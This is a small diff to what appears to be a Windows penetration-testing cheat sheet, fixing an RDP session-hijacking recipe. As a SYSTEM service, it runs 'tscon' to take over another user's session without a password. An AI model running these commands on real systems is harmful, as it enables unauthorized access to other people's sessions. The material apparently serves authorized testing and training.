@@ -192,7 +192,7 @@ Run `tscon.exe` as the SYSTEM user, you can connect to any session without a pas
 ```powershell
 # get the Session ID you want to hijack
 query user
-create sesshijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#55"
+sc.exe create sesshijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#55"
 net start sesshijack
 ```
 
